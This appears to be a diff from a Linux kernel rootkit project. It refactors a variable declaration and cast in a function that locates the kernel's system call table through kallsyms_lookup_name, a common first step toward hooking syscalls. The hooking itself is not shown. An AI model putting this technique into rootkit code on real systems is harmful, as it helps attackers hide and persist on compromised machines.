@@ -25,6 +25,7 @@ int rootkit_init(void) {
  * @return 0 if success, EFAULT if failure
  */
 int locate_sys_call_table(void) {
+  unsigned long *tmp;
 #ifndef CONFIG_KALLSYMS
   addr_size i = START_ADDRESS;
   addr_size **sctable; 
@@ -33,7 +34,7 @@ int locate_sys_call_table(void) {
 #if CONFIG_KALLSYMS
   /* kernel symbols are accessible */
   printk("CONFIG_KALLSYMS is enabled!");
-  unsigned long **tmp = (unsigned long**) kallsyms_lookup_name("sys_call_table");
+  tmp = (void *) kallsyms_lookup_name("sys_call_table");
   printk("kallsyms says the sys_call_table is at %p\n", tmp);
   sys_call_table_addr = (addr_size *) kallsyms_lookup_name("sys_call_table");
 
